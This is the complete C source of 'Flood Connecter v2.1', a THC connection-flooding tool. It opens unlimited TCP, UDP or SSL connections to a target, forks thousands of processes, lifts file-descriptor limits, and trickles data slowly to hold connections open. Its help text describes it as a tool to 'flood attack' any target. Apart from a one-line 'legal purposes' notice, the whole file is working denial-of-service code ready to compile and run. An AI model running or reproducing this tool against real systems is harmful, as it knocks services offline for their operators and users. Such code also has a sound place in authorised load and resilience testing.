/*
 * Flood Connecter v2.1 (c) 2003-2005 by van Hauser / THC <vh@thc.org>
 * http://www.thc.org
 *
 * Connection flooder, can also send data, keep connections open etc.
 *
 * Changes:
 *		2.1 Small enhancements and bugfixes
 *		2.0 added slow send options (-w/-W), very powerful!
 *		1.4 initial public release
 *
 * Use allowed only for legal purposes.
 *
 * To compile:   cc -o flood_connect -O2 flood_connect.c
 * with openssl: cc -o flood_connect -O2 flood_connect.c -DOPENSSL -lssl
 *
 */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>

#define PORT         80    // change this if you want
#define UNLIMITED    0     // dont change this
#define MAX_SOCKETS  65536 // change this if you want to
#define MAXFORKS     10240

#ifdef OPENSSL
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 SSL     *ssl = NULL;
 SSL_CTX *sslContext = NULL;
 RSA     *rsa = NULL;

 RSA *ssl_temp_rsa_cb(SSL *ssl, int export, int keylength) {
    if (rsa == NULL)
        rsa = RSA_generate_key(512, RSA_F4, NULL, NULL);
    return rsa;
 }
#endif

typedef struct {
    int socket;
#ifdef OPENSSL
    SSL *ssl;
#endif
    int where;
} socket_struct;

char *prg;
int   verbose = 0;
int   forks = 0;
int   pids[MAXFORKS];
int   warn = 0;
socket_struct sockets[MAX_SOCKETS];
time_t last_send = 0;
int   send_delay = 0;
int   send_amount = 0;
int   use_ssl = 0;
char *str = NULL;
int   str_len = 0;
unsigned long int count = 0, successful = 0;

void help() {
    printf("Flood Connect v2.0 (c) 2003 by van Hauser/THC <vh@thc.org> http://www.thc.org\n");
    printf("Syntax: %s [-S] [-u] [-p port] [-i file] [-n connects] [-N delay] [-c] [-C delay] [-d] [-D delay] [-w bytes] [-W delay] [-e] [-k] [-v] TARGET\n", prg);
    printf("Options:\n");
    printf("    -S           use SSL after TCP connect (not with -u, sets default port=443)\n");
    printf("    -u           use UDP protocol (default: TCP) (not usable with -c and -S)\n");
    printf("    -p port      port to connect to (default: %d)\n", PORT);
    printf("    -f forks     number of forks to additionally spawn (default: 0)\n");
    printf("    -i file      data to send to the port (default: none)\n");
    printf("    -n connects  maximum number of connects (default: unlimited)\n");
    printf("    -N delay     delay in ms between connects  (default: 0)\n");
    printf("    -c           close after connect (and sending data, if used with -i)\n");
    printf("                  use twice to shutdown SSL sessions hard (-S -c -c)\n");
    printf("    -C delay     delay in ms before closing the port (use with -c) (default: 0)\n");
    printf("    -d           dump data read from server\n");
    printf("    -D delay     delay in ms before read+dump data (-d) from server (default: 0)\n");
    printf("    -w bytes     amount of data from -i to send at one time (default: all)\n");
    printf("    -W delay     delay in seconds between sends, required by -w option\n");
    printf("    -e           stop when no more connects possible (default: retry forever)\n");
    printf("    -k           no keep-alive after finnishing with connects - terminate!\n");
    printf("    -v           verbose mode\n");
    printf("    TARGET       target to flood attack (ip or dns)\n");
    printf("Connection flooder. Nothing more to say. Use only allowed for legal purposes.\n");
    exit(-1);
}

void kill_children(int signo) {
    int i = 0;
    printf("Aborted (made %s%ld successful connects)\n", forks ? "approx. " : "", successful + successful * forks);
    while (i < forks) {
        kill(pids[i], SIGTERM);
        i++;
    }
    usleep(10000);
    i = 0;
    while (i < forks) {
        kill(pids[i], SIGKILL);
        i++;
    }
    exit(-1);
}

void killed_children(int signo) {
    int i = 0;
    if (verbose) {
      printf("Killed (made %ld successful connects)\n", successful);
    }
    exit(0);
}

void resend() {
    int i = 0, send = send_amount;
    
    if (last_send + send_delay > time(NULL))
        return;
    last_send = time(NULL);

    for (i = 0; i < MAX_SOCKETS; i++) {
        if (sockets[i].socket >= 0) {
            if (sockets[i].where < str_len) {
                if (sockets[i].where + send > str_len)
                    send = str_len - sockets[i].where;
                if (use_ssl) {
#ifdef OPENSSL
                    SSL_write(sockets[i].ssl, str + sockets[i].where, send);
#endif
                } else {
                    write(sockets[i].socket, str + sockets[i].where, send);
                }
                sockets[i].where += send;
            }
        }
    }
}

int main(int argc, char *argv[]) {
    unsigned short int  port = PORT;
    long int max_connects = UNLIMITED;
    int      close_connection = 0;
    int      exit_on_sock_error = 0;
    int      keep_alive = 1;
    int      debug = 0;
    int      dump = 0;
    long int connect_delay = 0, close_delay = 0, dump_delay = 0;
    char    *infile = NULL;
    struct   stat st;
    FILE    *f = NULL;
    int      i;
    int      s;
    int      ret;
    int      err;
    int      client = 0;
    int      reads = 0;
    int      sock_type = SOCK_STREAM;
    int      sock_protocol = IPPROTO_TCP;
    char     buf[8196];
    struct sockaddr_in target;
    struct hostent    *resolv;
    struct rlimit      rlim;
    int      pidcount = 0, res = 0;

    prg = argv[0];
    err = 0;
    memset(sockets, 0, sizeof(sockets));
    for (i = 0; i < MAX_SOCKETS; i++)
        sockets[i].socket = -1;

    if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
        help();

    while ((i = getopt(argc, argv, "cf:C:dD:N:ei:kn:p:SuvVw:W:")) >= 0) {
        switch (i) {
            case 'c': close_connection++; break;
            case 'f': forks = atoi(optarg); break;
            case 'N': connect_delay = atol(optarg); break;
            case 'C': close_delay = atol(optarg); break;
            case 'D': dump_delay = atol(optarg); break;
            case 'W': send_delay = atoi(optarg); break;
            case 'w': send_amount = atoi(optarg); break;
            case 'd': dump = 1; break;
            case 'e': exit_on_sock_error = 1; break;
            case 'u': sock_type = SOCK_DGRAM;
                      sock_protocol = IPPROTO_UDP;
                      break;
            case 'v': verbose = 1; break;
            case 'V': debug = 1; break;
            case 'i': infile = optarg; break;
            case 'k': keep_alive = 0; break;
            case 'n': max_connects = atol(optarg); break;
            case 'S': use_ssl = 1;
                      if (port == PORT)
                          port = 443;
#ifndef OPENSSL
                      fprintf(stderr, "Error: Not compiled with openssl support, use -DOPENSSL -lssl\n");
                      exit(-1);
#endif
                      break;
            case 'p': if (atoi(optarg) < 1 || atoi(optarg) > 65535) {
                          fprintf(stderr, "Error: port must be between 1 and 65535\n");
                          exit(-1);
                      }
                      port = atoi(optarg) % 65536;
                      break;
            default: fprintf(stderr,"Error: unknown option -%c\n", i); help();
        }
    }

    if (optind + 1 != argc) {
        fprintf(stderr, "Error: target missing or too many commandline options!\n");
        exit(-1);
    }
    
    if ((send_amount || send_delay) && ! (send_amount && send_delay) ) {
        fprintf(stderr, "Error: you must specify both -w and -W options together!\n");
        exit(-1);
    }

    if (close_connection && send_delay) {
        fprintf(stderr, "Error: you can not use -c and -w/-W options together!\n");
        exit(-1);
    }

    if (forks > MAXFORKS) {
        fprintf(stderr, "Error: Maximum number of pids is %d, edit code and recompile\n", MAXFORKS);
        exit(-1);
    }

    if (infile != NULL) {
        if ((f = fopen(infile, "r")) == NULL) {
            fprintf(stderr, "Error: can not find file %s\n", infile);
            exit(-1);
        }
        fstat(fileno(f), &st);
        str_len = (int) st.st_size;
        str = malloc(str_len);
        fread(str, str_len, 1, f);
        fclose(f);
    }

    if ((resolv = gethostbyname(argv[argc-1])) == NULL) {
        fprintf(stderr, "Error: can not resolve target\n");
        exit(-1);
    }
    memset(&target, 0, sizeof(target));
    memcpy(&target.sin_addr.s_addr, resolv->h_addr, 4);
    target.sin_port = htons(port);
    target.sin_family = AF_INET;

    if (connect_delay > 0)
        connect_delay = connect_delay * 1000; /* ms to microseconds */
    else
        connect_delay = 1;
    if (close_delay > 0)
        close_delay = close_delay * 1000; /* ms to microseconds */
    else
        close_delay = 1;
    if (dump_delay > 0)
        dump_delay = dump_delay * 1000; /* ms to microseconds */
    else
        dump_delay = 1;

    rlim.rlim_cur = MAXFORKS + 1;
    rlim.rlim_max = MAXFORKS + 2;
    ret = setrlimit(RLIMIT_NPROC, &rlim);
#ifndef RLIMIT_NOFILE
 #ifdef RLIMIT_OFILE
   #define RLIMIT_NOFILE RLIMIT_OFILE
 #endif
#endif
    rlim.rlim_cur = 60000;
    rlim.rlim_max = 60001;
    ret = setrlimit(RLIMIT_NOFILE, &rlim);
    rlim.rlim_cur = RLIM_INFINITY;
    rlim.rlim_max = RLIM_INFINITY;
    ret = setrlimit(RLIMIT_NPROC, &rlim);
    ret = setrlimit(RLIMIT_NOFILE, &rlim);
    if (verbose) {
        if (ret == 0)
            printf("setrlimit for unlimited filedescriptors succeeded.\n");
        else
            printf("setrlimit for unlimited filedescriptors failed.\n");
    }

    for (i = 3; i < 4096; i++)
        close(i);

    printf("Starting flood connect attack on %s port %d\n", inet_ntoa((struct in_addr)target.sin_addr), port);
    (void) setvbuf(stdout, NULL, _IONBF, 0);
    if (verbose)
        printf("Writing a \".\" for every 100 connect attempts\n");

    ret = 0;
    count = 0;
    successful = 0;
    i = 1;
    s = -1;
    res = 1;

    while(pidcount < forks && res != 0) {
        res = pids[pidcount] = fork();
        pidcount++;
    }

    if (res == 0) {
        client = 1;
        signal(SIGTERM, killed_children);
    }
        
    if (res != 0) {
        if (verbose && pidcount > 0)
          printf("Spawned %d clients\n", pidcount);
        signal(SIGTERM, kill_children);
        signal(SIGINT, kill_children);
        signal(SIGSEGV, kill_children);
        signal(SIGHUP, kill_children);
    }

    if (use_ssl) {
#ifdef OPENSSL
        SSL_load_error_strings();
        SSLeay_add_ssl_algorithms();

        // context: ssl2 + ssl3 is allowed, whatever the server demands
        if ((sslContext = SSL_CTX_new(SSLv23_method())) == NULL) {
            if (verbose) {
                err = ERR_get_error();
                fprintf(stderr, "SSL: Error allocating context: %s\n", ERR_error_string(err, NULL));
            }
            res = -1;
        }

        // set the compatbility mode
        SSL_CTX_set_options(sslContext, SSL_OP_ALL);

        // we set the default verifiers and dont care for the results
        (void) SSL_CTX_set_default_verify_paths(sslContext);
        SSL_CTX_set_tmp_rsa_callback(sslContext, ssl_temp_rsa_cb);
        SSL_CTX_set_verify(sslContext, SSL_VERIFY_NONE, NULL);
#endif
    }

    while (count < max_connects || max_connects == UNLIMITED) {
        if (ret >= 0) {
            if ((s = socket(AF_INET, sock_type, sock_protocol)) < 0) {
                if (verbose && warn == 0) {
                    perror("Warning (socket)");
                    warn = 1;
                }
                if (exit_on_sock_error)
                    exit(0);
            } else {
               setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &i, sizeof(i));
            }
        }
        if (s >= 0) {
            ret = connect(s, (struct sockaddr *)&target, sizeof(target));
            if (use_ssl && ret >= 0) {
#ifdef OPENSSL
                if ((ssl = SSL_new(sslContext)) == NULL) {
                    if (verbose) {
                        err = ERR_get_error();
                        fprintf(stderr, "Error preparing an SSL context: %s\n", ERR_error_string(err, NULL));
                    }
                    ret = -1;
                } else
                    SSL_set_fd(ssl, s);
                if (ret >= 0 && SSL_connect(ssl) <= 0) {
                    printf("ERROR %d\n", SSL_connect(ssl));
                    if (verbose) {
                        err = ERR_get_error();
                        fprintf(stderr, "Could not create an SSL session: %s\n", ERR_error_string(err, NULL));
                    }
                    ret = -1;
                }

                if (debug)
                    fprintf(stderr, "SSL negotiated cipher: %s\n", SSL_get_cipher(ssl));
#endif
            }
            count++;
            if (ret >= 0) {
                successful++;
                warn = 0;
                if (str_len > 0) {
                    sockets[s].socket = s;
                    sockets[s].where = 0;
#ifdef OPENSSL
                    sockets[s].ssl = ssl;
#endif
                    if (! use_ssl)
                        if (setsockopt(s, SOL_TCP, TCP_NODELAY, &i, sizeof(i)) != 0)
                            perror("Warning (setsockopt SOL_TCP)");
                    if (send_delay > 0) {
                        resend();
                    } else {
                        if (use_ssl) {
#ifdef OPENSSL
                            SSL_write(ssl, str, str_len);
#endif
                        } else {
                            write(s, str, str_len);
                        }
                    }
                }
                if (dump) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    if (dump_delay > 0)
                        usleep(dump_delay);
                    if (use_ssl) {
#ifdef OPENSSL
                        reads = SSL_read(ssl, buf, sizeof(buf));
#endif
                    } else {
                        reads = read(s, buf, sizeof(buf));
                    }
                    if (reads > 0)
                        printf("DATA: %s\n", buf);
                    if (send_delay > 0)
                        resend();
                }
                if (close_connection) {
                    if (close_delay > 0)
                        usleep(close_delay);
#ifdef OPENSSL
                    if (use_ssl && close_connection == 1)
                        SSL_shutdown(ssl);
#endif
                    close(s);
#ifdef OPENSSL
                    if (use_ssl && close_connection > 1)
                        SSL_shutdown(ssl);
#endif
                }
                if (connect_delay > 0)
                    usleep(connect_delay);
            } else {
                if (verbose && warn == 0) {
                    perror("Warning (connect)");
                    warn = 1;
                }
                if (exit_on_sock_error)
                    exit(0);
            }
            if (verbose)
                if (count % 100 == 0)
                    printf(".");
            if (send_delay > 0)
                resend();
        } else
            close(s);
    }
    if (client) {
        while (1) {}
    } else {
        if (verbose)
            printf("\n");
        printf("Done (made %s%ld successful connects)\n", forks ? "approx. " : "", successful + successful * forks);
        if (send_delay) {
            int end = 0;
            printf("Still sending data ...\n");
            while(! end) {
                resend();
                sleep(send_delay);
                end = 1;
                for (i = 0; i < MAX_SOCKETS; i++)
                    if (sockets[i].socket >= 0 && sockets[i].where < str_len)
                        end = 0;
            }
        }
        if (keep_alive && close_connection == 0) {
            printf("Press <ENTER> to terminate connections and this program\n");
            (void) getc(stdin);
        }
    
	if (forks > 0) {
	    usleep(1 + connect_delay + dump_delay + close_delay);
            while (i < forks) {
                kill(pids[i], SIGTERM);
                i++;
            }
	    usleep(10000);
	    i = 0;
            while (i < forks) {
                kill(pids[i], SIGKILL);
                i++;
            }
        }
    }
    return 0;
}
